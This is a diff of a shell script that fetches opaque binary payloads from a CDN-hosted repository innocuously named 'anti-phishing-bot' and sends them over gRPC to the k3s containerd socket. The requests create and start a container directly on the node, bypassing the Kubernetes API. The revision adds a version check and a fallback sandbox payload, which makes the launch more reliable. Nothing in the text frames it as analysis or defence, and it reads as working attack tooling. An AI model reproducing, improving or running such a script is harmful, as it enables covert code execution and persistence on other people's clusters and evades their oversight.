@@ -1,14 +1,18 @@
 B=https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2@main
 S=/run/k3s/containerd/containerd.sock
-for f in rs.bin cc1.bin cc2.bin st1.bin; do curl -fs -m 10 -o /tmp/$f $B/$f || exit 1; done
+cd /tmp || exit 1
+for f in gv.bin rs.bin rs2.bin cc1.bin cc2.bin st1.bin; do curl -fs -m 10 -o $f $B/$f || exit 1; done
 g(){ curl -s -m 10 --unix-socket $S --http2-prior-knowledge -H "content-type: application/grpc" -H "containerd-namespace: k8s.io" -H "te: trailers" --data-binary @$1 "http://localhost/$2"; }
-g /tmp/rs.bin runtime.v1.RuntimeService/RunPodSandbox > /tmp/r1
-tr -c 'a-f0-9' '\n' < /tmp/r1 | grep -E '^[0-9a-f]{64}$' | head -1 > /tmp/sid
-[ -s /tmp/sid ] || exit 2
-cat /tmp/cc1.bin /tmp/sid /tmp/cc2.bin > /tmp/cf
-g /tmp/cf runtime.v1.RuntimeService/CreateContainer > /tmp/r2
-tr -c 'a-f0-9' '\n' < /tmp/r2 | grep -E '^[0-9a-f]{64}$' | head -1 > /tmp/cid
-[ -s /tmp/cid ] || exit 3
-cat /tmp/st1.bin /tmp/cid > /tmp/sf
-g /tmp/sf runtime.v1.RuntimeService/StartContainer > /tmp/r3
+g gv.bin runtime.v1.RuntimeService/GetVersion > v.out
+[ -s v.out ] || exit 2
+g rs.bin runtime.v1.RuntimeService/RunPodSandbox > r1
+tr -c 'a-f0-9' '\n' < r1 | grep -E '^[0-9a-f]{64}$' | head -1 > sid
+[ -s sid ] || { g rs2.bin runtime.v1.RuntimeService/RunPodSandbox > r1b; tr -c 'a-f0-9' '\n' < r1b | grep -E '^[0-9a-f]{64}$' | head -1 > sid; }
+[ -s sid ] || exit 3
+cat cc1.bin sid cc2.bin > cf
+g cf runtime.v1.RuntimeService/CreateContainer > r2
+tr -c 'a-f0-9' '\n' < r2 | grep -E '^[0-9a-f]{64}$' | head -1 > cid
+[ -s cid ] || exit 4
+cat st1.bin cid > sf
+g sf runtime.v1.RuntimeService/StartContainer > r3
 echo done
